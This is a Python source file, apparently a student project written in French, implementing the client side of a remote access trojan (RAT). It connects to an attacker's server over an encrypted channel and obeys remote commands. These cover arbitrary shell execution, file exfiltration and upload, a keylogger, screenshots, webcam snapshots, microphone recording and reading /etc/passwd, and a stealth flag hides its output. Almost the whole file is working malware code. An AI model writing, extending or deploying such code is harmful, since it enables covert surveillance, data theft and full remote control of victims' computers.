#Changement TARDIF car Manu a revert le mauvais projet ce qui a foiré la moitié du code (j'espère que ce lui la est le bon,
# sinon tout est dispo dans le .zip fournis sur myges)
import socket
import json
import time
import base64
import os
import sys
import platform
import subprocess
import threading
import getpass
import tempfile
from cryptography.fernet import Fernet

# Imports conditionnels
try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import cv2
    HAS_OPENCV = True
except ImportError:
    HAS_OPENCV = False

try:
    import pyaudio
    import wave
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

class WorkingClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
        # Même clé que le serveur
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
        # Keylogger - CORRECTION: ajout du listener
        self.keylogger_active = False
        self.keylog_buffer = []
        self.keylogger_listener = None  # NOUVEAU: stocke le listener
        
    def connect(self):
        """Se connecte au serveur"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            
            # Envoie les informations du client
            client_info = {
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'os': platform.system(),
                'os_version': platform.release(),
                'architecture': platform.machine(),
                'python_version': platform.python_version(),
                'timestamp': time.time()
            }
            
            # Envoie avec le nouveau protocole (taille + données)
            if not self._send_message(client_info):
                return False
            
            # Reçoit la confirmation
            response_data = self._receive_full_message()
            if response_data:
                try:
                    decrypted_response = self.cipher.decrypt(response_data)
                    response = json.loads(decrypted_response.decode('utf-8'))
                    
                    if response.get('status') == 'connected':
                        print(f"[+] Connecté au serveur (ID: {response.get('client_id')})")
                        return True
                except Exception as e:
                    print(f"[-] Erreur déchiffrement confirmation: {e}")
            
            return False
            
        except Exception as e:
            print(f"[-] Erreur de connexion: {e}")
            return False
    
    def _send_message(self, message):
        """Envoie un message avec taille - ROBUSTE comme ton ami"""
        try:
            # Sérialise et chiffre
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            # Envoie la taille d'abord (4 bytes)
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            self.socket.sendall(size_bytes)
            
            # Puis les données
            self.socket.sendall(encrypted_data)
            return True
            
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def _receive_full_message(self):
        """Reçoit un message complet - ROBUSTE pour gros messages"""
        try:
            # D'abord reçoit la taille du message (4 bytes)
            size_data = b''
            while len(size_data) < 4:
                chunk = self.socket.recv(4 - len(size_data))
                if not chunk:
                    return None
                size_data += chunk
            
            # Décode la taille
            message_size = int.from_bytes(size_data, 'big')
            
            # Limite pour sécurité
            if message_size > 50 * 1024 * 1024:  # 50MB max
                print(f"[WARNING] Message trop gros: {message_size}")
                return None
            
            # Reçoit le message complet par chunks
            message_data = b''
            while len(message_data) < message_size:
                chunk_size = min(4096, message_size - len(message_data))
                chunk = self.socket.recv(chunk_size)
                if not chunk:
                    return None
                message_data += chunk
            
            return message_data
            
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def start(self):
        """Démarre le client"""
        if not self.connect():
            return
        
        self.running = True
        
        # Démarre le thread de heartbeat
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Boucle principale
        self.main_loop()
    
    def heartbeat_loop(self):
        """Envoie des heartbeats au serveur - SÉPARÉ comme ton ami"""
        while self.running:
            try:
                heartbeat = {'type': 'heartbeat', 'timestamp': time.time()}
                self._send_message(heartbeat)
                time.sleep(30)  # Heartbeat toutes les 30 secondes
            except Exception as e:
                print(f"[-] Erreur heartbeat: {e}")
                break
    
    def main_loop(self):
        """Boucle principale du client"""
        print("[*] Client démarré - En attente de commandes")
        
        while self.running:
            try:
                # Reçoit les commandes du serveur
                data = self._receive_full_message()
                if not data:
                    break
                
                # Déchiffre la commande
                try:
                    decrypted_data = self.cipher.decrypt(data)
                    command_data = json.loads(decrypted_data.decode('utf-8'))
                except Exception as e:
                    print(f"[-] Erreur déchiffrement: {e}")
                    continue
                
                if command_data.get('type') == 'command':
                    command = command_data.get('command')
                    args = command_data.get('args', [])
                    
                    print(f"[*] Exécution: {command}")
                    
                    # Exécute la commande
                    result = self.execute_command(command, args)
                    
                    # Envoie la réponse
                    self._send_message(result)
                
                elif command_data.get('type') == 'heartbeat_ack':
                    # Accusé de réception heartbeat
                    pass
                
            except Exception as e:
                print(f"[-] Erreur de traitement: {e}")
                break
        
        self.cleanup()
    
    def execute_command(self, command, args):
        """Exécute une commande"""
        try:
            if command == "help":
                return self.cmd_help()
            elif command == "ipconfig":
                return self.cmd_ipconfig()
            elif command == "screenshot":
                return self.cmd_screenshot()
            elif command == "shell":
                return self.cmd_shell(args)
            elif command == "download":
                return self.cmd_download(args)
            elif command == "upload":
                return self.cmd_upload(args)
            elif command == "search":
                return self.cmd_search(args)
            elif command == "hashdump":
                return self.cmd_hashdump()
            elif command == "keylogger":
                return self.cmd_keylogger(args)
            elif command == "webcam_snapshot":
                return self.cmd_webcam_snapshot()
            elif command == "webcam_stream":
                return self.cmd_webcam_stream()
            elif command == "record_audio":
                return self.cmd_record_audio(args)
            elif command == "test_microphone":  # NOUVELLE COMMANDE
                return self.cmd_test_microphone()
            else:
                return {'output': f'Commande inconnue: {command}'}
                
        except Exception as e:
            return {'output': f'Erreur d\'exécution: {str(e)}'}
    
    def cmd_help(self):
        """Commande help"""
        help_text = """Commandes disponibles:
  help            - Affiche cette aide
  ipconfig        - Configuration réseau
  screenshot      - Capture d'écran
  shell <cmd>     - Exécute une commande
  download <file> - Télécharge un fichier
  upload <file>   - Upload un fichier
  search <pattern> - Recherche de fichiers
  hashdump        - Dump des hash
  keylogger start/stop - Keylogger
  webcam_snapshot - Photo webcam
  webcam_stream   - Stream webcam
  record_audio <sec> - Enregistrement audio
  test_microphone - Test du microphone
"""
        return {'output': help_text}
    
    def cmd_ipconfig(self):
        """Commande ipconfig"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
            
            return {'output': result.stdout if result.returncode == 0 else result.stderr}
        except Exception as e:
            return {'output': f'Erreur ipconfig: {str(e)}'}
    
    def cmd_screenshot(self):
        """Commande screenshot - VERSION ROBUSTE PIL + PowerShell"""
        print("[DEBUG] Début screenshot...")
        
        # Méthode 1: PIL si disponible
        if HAS_PIL:
            try:
                print("[DEBUG] Tentative PIL...")
                screenshot = ImageGrab.grab()
                
                # Encode directement en mémoire
                from io import BytesIO
                img_buffer = BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_buffer.seek(0)
                
                image_data = base64.b64encode(img_buffer.getvalue()).decode()
                img_buffer.close()
                
                print("[DEBUG] Screenshot PIL réussi!")
                return {
                    'output': 'Screenshot PIL réussi',
                    'image_data': image_data
                }
            except Exception as e:
                print(f"[DEBUG] PIL échoué: {e}, tentative PowerShell...")
        
        # Méthode 2: PowerShell Windows
        try:
            print("[DEBUG] Tentative PowerShell...")
            
            ps_script = '''
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$memoryStream = New-Object System.IO.MemoryStream
$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
$bytes = $memoryStream.ToArray()
$memoryStream.Close()
$bitmap.Dispose()
$graphics.Dispose()
[Convert]::ToBase64String($bytes)
            '''
            
            result = subprocess.run([
                "powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script
            ], capture_output=True, text=True, timeout=45)
            
            print(f"[DEBUG] PowerShell code: {result.returncode}")
            
            if result.returncode == 0 and result.stdout.strip():
                print("[DEBUG] Screenshot PowerShell réussi!")
                return {
                    'output': 'Screenshot PowerShell réussi',
                    'image_data': result.stdout.strip()
                }
            else:
                print(f"[DEBUG] PowerShell échoué: {result.stderr}")
                return {'output': f'Screenshot PowerShell échoué: {result.stderr[:200]}'}
                
        except subprocess.TimeoutExpired:
            return {'output': 'Timeout screenshot PowerShell (45s)'}
        except Exception as e:
            print(f"[DEBUG] Exception PowerShell: {e}")
            return {'output': f'Erreur screenshot PowerShell: {str(e)}'}
    
    def cmd_shell(self, args):
        """Commande shell"""
        if not args:
            return {'output': 'Usage: shell <commande>'}
        
        try:
            command = " ".join(args)
            
            if platform.system() == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["/bin/sh", "-c", command], capture_output=True, text=True, timeout=30)
            
            output = result.stdout
            if result.stderr:
                output += f"\nSTDERR:\n{result.stderr}"
            
            return {'output': output or 'Commande exécutée (pas de sortie)'}
        except subprocess.TimeoutExpired:
            return {'output': 'Timeout de commande (30s)'}
        except Exception as e:
            return {'output': f'Erreur shell: {str(e)}'}
    
    def cmd_download(self, args):
        """Commande download"""
        if not args:
            return {'output': 'Usage: download <chemin_fichier>'}
        
        file_path = args[0]
        
        try:
            if not os.path.exists(file_path):
                return {'output': f'Fichier inexistant: {file_path}'}
            
            if not os.path.isfile(file_path):
                return {'output': f'N\'est pas un fichier: {file_path}'}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:  # 50MB
                return {'output': f'Fichier trop volumineux: {file_size} bytes'}
            
            with open(file_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            
            filename = os.path.basename(file_path)
            
            print(f"[DEBUG] Fichier encodé: {filename}, taille: {file_size}")
            
            return {
                'output': f'Fichier prêt: {filename} ({file_size} bytes)',
                'file_data': file_data,
                'filename': filename,
                'size': file_size
            }
        except Exception as e:
            return {'output': f'Erreur download: {str(e)}'}
    
    def cmd_upload(self, args):
        """Commande upload"""
        if len(args) < 2:
            return {'output': 'Usage: upload <chemin_destination> <données_base64>'}
        
        dest_path = args[0]
        file_data_b64 = args[1]
        
        try:
            file_data = base64.b64decode(file_data_b64)
            
            dest_dir = os.path.dirname(dest_path)
            if dest_dir:
                os.makedirs(dest_dir, exist_ok=True)
            
            with open(dest_path, "wb") as f:
                f.write(file_data)
            
            return {'output': f'Fichier uploadé: {dest_path} ({len(file_data)} bytes)'}
        except Exception as e:
            return {'output': f'Erreur upload: {str(e)}'}
    
    def cmd_search(self, args):
        """Commande search"""
        if not args:
            return {'output': 'Usage: search <pattern>'}
        
        pattern = args[0]
        
        try:
            search_root = os.path.expanduser("~")
            found_files = []
            count = 0
            max_results = 50
            
            for root, dirs, files in os.walk(search_root):
                if count >= max_results:
                    break
                for file in files:
                    if count >= max_results:
                        break
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(full_path)
                            found_files.append(f"{full_path} ({file_size} bytes)")
                        except:
                            found_files.append(full_path)
                        count += 1
            
            if found_files:
                result = f"Fichiers trouvés ({len(found_files)}):\n" + "\n".join(found_files)
                if count >= max_results:
                    result += f"\n... (limité à {max_results} résultats)"
            else:
                result = f"Aucun fichier trouvé pour '{pattern}'"
            
            return {'output': result}
        except Exception as e:
            return {'output': f'Erreur search: {str(e)}'}
    
    def cmd_hashdump(self):
        """Commande hashdump"""
        try:
            if platform.system() == "Windows":
                return self._windows_hashdump()
            else:
                return self._linux_hashdump()
        except Exception as e:
            return {'output': f'Erreur hashdump: {str(e)}'}
    
    def _windows_hashdump(self):
        """Hashdump Windows (simulation éducative)"""
        output = "HASHDUMP Windows (simulation éducative):\n"
        output += "Note: L'accès réel à SAM nécessite des privilèges administrateur\n"
        
        try:
            result = subprocess.run(["net", "user"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                output += "Utilisateurs locaux:\n" + result.stdout
            else:
                output += "Impossible d'énumérer les utilisateurs"
        except:
            output += "Commande net non disponible"
        
        return {'output': output}
    
    def _linux_hashdump(self):
        """Hashdump Linux (simulation éducative)"""
        output = "HASHDUMP Linux (simulation éducative):\n"
        
        try:
            with open("/etc/passwd", "r") as f:
                passwd_content = f.read()
            output += "Contenu de /etc/passwd:\n" + passwd_content[:1000]
            if len(passwd_content) > 1000:
                output += "\n... (tronqué)"
        except:
            output += "Impossible de lire /etc/passwd"
        
        output += "\n\nNote: /etc/shadow nécessite des privilèges root"
        return {'output': output}
    
    def cmd_keylogger(self, args):
        """Commande keylogger - VERSION CORRIGÉE"""
        if not args or args[0] not in ["start", "stop", "off"]:  # CORRECTION: accepte aussi "off"
            return {'output': 'Usage: keylogger start|stop'}
        
        if not HAS_PYNPUT:
            return {'output': 'pynput non disponible pour le keylogger'}
        
        action = args[0]
        if action == "off":  # CORRECTION: traite "off" comme "stop"
            action = "stop"
        
        if action == "start":
            if self.keylogger_active:
                return {'output': 'Keylogger déjà actif'}
            
            try:
                self.keylogger_active = True
                self.keylog_buffer = []
                
                def on_press(key):
                    if not self.keylogger_active:
                        return False
                    try:
                        if hasattr(key, 'char') and key.char:
                            self.keylog_buffer.append(key.char)
                        else:
                            self.keylog_buffer.append(f"[{key.name}]")
                        
                        # DEBUG: affiche les touches en temps réel
                        if hasattr(key, 'char') and key.char:
                            print(f"[KEYLOG] Touche: '{key.char}'")
                        else:
                            print(f"[KEYLOG] Touche spéciale: {key.name}")
                            
                    except Exception as e:
                        self.keylog_buffer.append("[SPECIAL]")
                        print(f"[KEYLOG] Erreur: {e}")
                    
                    # Limite le buffer
                    if len(self.keylog_buffer) > 1000:
                        self.keylog_buffer = self.keylog_buffer[-500:]
                
                # CORRECTION: stocke le listener pour pouvoir l'arrêter
                self.keylogger_listener = keyboard.Listener(on_press=on_press)
                self.keylogger_listener.start()
                
                print("[DEBUG] Keylogger listener démarré")
                return {'output': 'Keylogger démarré - Tapez du texte pour tester'}
                
            except Exception as e:
                self.keylogger_active = False
                self.keylogger_listener = None
                return {'output': f'Erreur keylogger: {str(e)}'}
        
        elif action == "stop":
            if not self.keylogger_active:
                return {'output': 'Keylogger non actif'}
            
            try:
                # CORRECTION: arrête proprement le listener
                self.keylogger_active = False
                
                if self.keylogger_listener:
                    self.keylogger_listener.stop()
                    self.keylogger_listener = None
                    print("[DEBUG] Keylogger listener arrêté")
                
                # Retourne les données capturées
                if self.keylog_buffer:
                    keylog_data = "".join(self.keylog_buffer)
                    buffer_size = len(self.keylog_buffer)
                    self.keylog_buffer = []  # Vide le buffer
                    
                    return {
                        'output': f'Keylogger arrêté. {buffer_size} touches capturées:\n\n--- DÉBUT KEYLOG ---\n{keylog_data}\n--- FIN KEYLOG ---'
                    }
                else:
                    return {'output': 'Keylogger arrêté. Aucune donnée capturée.'}
                    
            except Exception as e:
                return {'output': f'Erreur arrêt keylogger: {str(e)}'}
    
    def cmd_webcam_snapshot(self):
        """Commande webcam_snapshot"""
        if not HAS_OPENCV:
            return {'output': 'OpenCV non disponible pour la webcam'}
        
        try:
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                return {'output': 'Impossible d\'accéder à la webcam'}
            
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                return {'output': 'Impossible de capturer une image'}
            
            _, buffer = cv2.imencode('.jpg', frame)
            image_data = base64.b64encode(buffer).decode()
            
            return {
                'output': 'Photo webcam capturée',
                'image_data': image_data
            }
        except Exception as e:
            return {'output': f'Erreur webcam: {str(e)}'}
    
    def cmd_webcam_stream(self):
        """Commande webcam_stream"""
        return {'output': 'Stream webcam - Fonctionnalité à implémenter complètement'}
    
    def cmd_record_audio(self, args):
        """Commande record_audio - VERSION CORRIGÉE AVEC DÉTECTION AUTOMATIQUE"""
        if not args:
            return {'output': 'Usage: record_audio <durée_secondes>'}
        
        if not HAS_AUDIO:
            return {'output': 'PyAudio non disponible pour l\'enregistrement'}
        
        try:
            duration = int(args[0])
            if duration <= 0 or duration > 60:
                return {'output': 'Durée invalide (1-60 secondes)'}
            
            print(f"[DEBUG] Recording audio for {duration} seconds...")
            
            p = pyaudio.PyAudio()
            
            # ÉTAPE 1: Teste tous les périphériques d'entrée pour trouver le meilleur
            print("[DEBUG] Testing input devices...")
            best_device = None
            best_config = None
            
            # Configurations à tester (channels, rate, chunk)
            configs_to_test = [
                (1, 44100, 1024),    # Mono 44.1kHz
                (2, 44100, 1024),    # Stéréo 44.1kHz
                (1, 22050, 1024),    # Mono 22kHz
                (1, 16000, 1024),    # Mono 16kHz
                (1, 8000, 1024),     # Mono 8kHz
            ]
            
            # Teste les périphériques d'entrée
            for device_idx in range(p.get_device_count()):
                try:
                    device_info = p.get_device_info_by_index(device_idx)
                    if device_info['maxInputChannels'] == 0:
                        continue
                    
                    print(f"[DEBUG] Testing device {device_idx}: {device_info['name']}")
                    
                    # Teste chaque configuration sur ce périphérique
                    for channels, rate, chunk in configs_to_test:
                        try:
                            # Teste l'ouverture du stream
                            stream = p.open(
                                format=pyaudio.paInt16,
                                channels=channels,
                                rate=rate,
                                input=True,
                                input_device_index=device_idx,
                                frames_per_buffer=chunk
                            )
                            
                            # Teste l'enregistrement pendant 0.5 seconde
                            test_frames = []
                            max_amplitude = 0
                            
                            for i in range(int(rate / chunk * 0.5)):  # 0.5 seconde
                                try:
                                    data = stream.read(chunk, exception_on_overflow=False)
                                    test_frames.append(data)
                                    
                                    # Calcule l'amplitude
                                    import struct
                                    if channels == 1:
                                        samples = struct.unpack(f'<{len(data)//2}h', data)
                                    else:
                                        # Prend un canal sur deux pour stéréo
                                        samples = struct.unpack(f'<{len(data)//4}h', data[::4])
                                    
                                    frame_max = max(abs(s) for s in samples) if samples else 0
                                    max_amplitude = max(max_amplitude, frame_max)
                                    
                                except Exception as e:
                                    print(f"[DEBUG] Read error: {e}")
                                    break
                            
                            stream.close()
                            
                            # Calcule le niveau audio
                            level_percent = (max_amplitude / 32767) * 100
                            print(f"[DEBUG] Device {device_idx}, config {channels}ch/{rate}Hz: {level_percent:.1f}% level")
                            
                            # Si on détecte du son, c'est notre meilleur périphérique
                            if level_percent > 1.0:  # Seuil minimum de 1%
                                best_device = device_idx
                                best_config = (channels, rate, chunk)
                                print(f"[DEBUG] Found working device: {device_idx} with level {level_percent:.1f}%")
                                break
                                
                        except Exception as e:
                            print(f"[DEBUG] Config {channels}ch/{rate}Hz failed: {str(e)[:50]}")
                            continue
                    
                    # Si on a trouvé un bon périphérique, on arrête
                    if best_device is not None:
                        break
                        
                except Exception as e:
                    print(f"[DEBUG] Device {device_idx} failed: {e}")
                    continue
            
            # Si aucun périphérique ne fonctionne, utilise le périphérique par défaut
            if best_device is None:
                try:
                    default_info = p.get_default_input_device_info()
                    best_device = default_info['index']
                    best_config = (1, 22050, 1024)  # Configuration basique
                    print(f"[DEBUG] No working device found, using default: {default_info['name']}")
                except:
                    p.terminate()
                    return {'output': 'Aucun périphérique audio fonctionnel trouvé'}
            
            # ÉTAPE 2: Enregistrement avec le meilleur périphérique trouvé
            channels, rate, chunk = best_config
            print(f"[DEBUG] Recording with device {best_device}, {channels}ch, {rate}Hz")
            
            try:
                stream = p.open(
                    format=pyaudio.paInt16,
                    channels=channels,
                    rate=rate,
                    input=True,
                    input_device_index=best_device,
                    frames_per_buffer=chunk
                )
            except Exception as e:
                p.terminate()
                return {'output': f'Impossible d\'ouvrir le périphérique sélectionné: {str(e)}'}
            
            # Enregistrement principal
            print(f"[DEBUG] Recording {duration} seconds...")
            frames = []
            total_amplitude = 0
            
            for i in range(0, int(rate / chunk * duration)):
                try:
                    data = stream.read(chunk, exception_on_overflow=False)
                    frames.append(data)
                    
                    # Calcule l'amplitude pour diagnostic
                    import struct
                    if channels == 1:
                        samples = struct.unpack(f'<{len(data)//2}h', data)
                    else:
                        samples = struct.unpack(f'<{len(data)//4}h', data[::4])
                    
                    frame_max = max(abs(s) for s in samples) if samples else 0
                    total_amplitude = max(total_amplitude, frame_max)
                    
                    # Feedback chaque seconde
                    if i % (rate // chunk) == 0:
                        seconds = i // (rate // chunk)
                        if seconds > 0:
                            current_level = (frame_max / 32767) * 100
                            print(f"[DEBUG] {seconds}s - Current level: {current_level:.1f}%")
                            
                except Exception as e:
                    print(f"[DEBUG] Recording error: {e}")
                    frames.append(b'\x00' * (chunk * channels * 2))
            
            stream.close()
            p.terminate()
            
            # Diagnostic final
            final_level = (total_amplitude / 32767) * 100
            print(f"[DEBUG] Recording completed. Max level: {final_level:.1f}%")
            
            # ÉTAPE 3: Création du fichier WAV
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as temp_file:
                temp_path = temp_file.name
            
            try:
                wf = wave.open(temp_path, 'wb')
                wf.setnchannels(channels)
                wf.setsampwidth(2)  # 16-bit = 2 bytes
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                # Lit le fichier WAV créé
                with open(temp_path, "rb") as f:
                    wav_data = f.read()
                
                os.unlink(temp_path)
                
                # Encode en Base64
                audio_data_b64 = base64.b64encode(wav_data).decode()
                
                # Message de diagnostic
                diagnostic = f"Audio enregistré ({duration}s) - {len(wav_data)} bytes\n"
                diagnostic += f"Configuration: {channels}ch, {rate}Hz\n"
                diagnostic += f"Périphérique: {best_device}\n"
                diagnostic += f"Niveau max détecté: {final_level:.1f}%\n"
                
                if final_level < 1.0:
                    diagnostic += "\n⚠️ ATTENTION: Niveau audio très faible!\n"
                    diagnostic += "Vérifiez:\n"
                    diagnostic += "- Le microphone n'est pas muet dans Windows\n"
                    diagnostic += "- Le volume du microphone est suffisant\n"
                    diagnostic += "- Les permissions microphone sont accordées\n"
                    diagnostic += "- Parlez près du microphone pendant l'enregistrement\n"
                
                return {
                    'output': diagnostic,
                    'audio_data': audio_data_b64
                }
                
            except Exception as e:
                try:
                    os.unlink(temp_path)
                except:
                    pass
                return {'output': f'Erreur création WAV: {str(e)}'}
                
        except ValueError:
            return {'output': 'Durée invalide - utilisez un nombre entre 1 et 60'}
        except Exception as e:
            return {'output': f'Erreur audio: {str(e)}'}

    def cmd_test_microphone(self):
        """Commande pour tester uniquement le microphone"""
        if not HAS_AUDIO:
            return {'output': 'PyAudio non disponible'}
        
        try:
            import struct
            
            p = pyaudio.PyAudio()
            result = "=== TEST MICROPHONE ===\n"
            
            # Liste tous les périphériques
            result += "Périphériques d'entrée détectés:\n"
            for i in range(p.get_device_count()):
                try:
                    info = p.get_device_info_by_index(i)
                    if info['maxInputChannels'] > 0:
                        result += f"  [{i}] {info['name']} - {info['maxInputChannels']} canaux\n"
                        result += f"      Sample rate: {int(info['defaultSampleRate'])}Hz\n"
                except:
                    pass
            
            # Test du périphérique par défaut
            try:
                default = p.get_default_input_device_info()
                result += f"\nPériphérique par défaut: {default['name']}\n"
                
                # Test d'ouverture
                stream = p.open(
                    format=pyaudio.paInt16,
                    channels=1,
                    rate=22050,
                    input=True,
                    frames_per_buffer=1024
                )
                
                result += "✅ Ouverture du stream: OK\n"
                
                # Test de lecture pendant 1 seconde
                frames = []
                max_level = 0
                
                for i in range(22):  # ~1 seconde à 22050Hz avec chunks de 1024
                    data = stream.read(1024, exception_on_overflow=False)
                    frames.append(data)
                    
                    # Calcule le niveau
                    samples = struct.unpack('<1024h', data)
                    frame_max = max(abs(s) for s in samples)
                    max_level = max(max_level, frame_max)
                
                stream.close()
                
                level_percent = (max_level / 32767) * 100
                result += f"✅ Test d'enregistrement 1s: OK\n"
                result += f"📊 Niveau maximum détecté: {level_percent:.1f}%\n"
                
                if level_percent < 0.1:
                    result += "🚨 PROBLÈME: Aucun signal audio détecté\n"
                    result += "Solutions:\n"
                    result += "- Vérifiez que le micro n'est pas muet\n"
                    result += "- Vérifiez les permissions Windows\n"
                    result += "- Testez avec un autre logiciel (Audacity, etc.)\n"
                elif level_percent < 5.0:
                    result += "⚠️ Signal faible - augmentez le volume du micro\n"
                else:
                    result += "✅ Signal audio détecté - microphone fonctionne\n"
                
            except Exception as e:
                result += f"❌ Erreur test périphérique: {e}\n"
            
            p.terminate()
            return {'output': result}
            
        except Exception as e:
            return {'output': f'Erreur test microphone: {e}'}
    
    def cleanup(self):
        """Nettoie les ressources - CORRECTION: arrête le keylogger"""
        self.running = False
        self.keylogger_active = False
        
        # NOUVEAU: arrête le keylogger au cleanup
        if self.keylogger_listener:
            try:
                self.keylogger_listener.stop()
                self.keylogger_listener = None
            except:
                pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print("[*] Client arrêté")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Client RAT robuste")
    parser.add_argument("host", help="Adresse du serveur")
    parser.add_argument("port", type=int, help="Port du serveur")
    parser.add_argument("--stealth", action="store_true", help="Mode furtif")
    
    args = parser.parse_args()
    
    if args.stealth:
        # Mode silencieux
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = sys.stdout
    
    client = WorkingClient(args.host, args.port)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du client")
        client.cleanup()

if __name__ == "__main__":
    main()
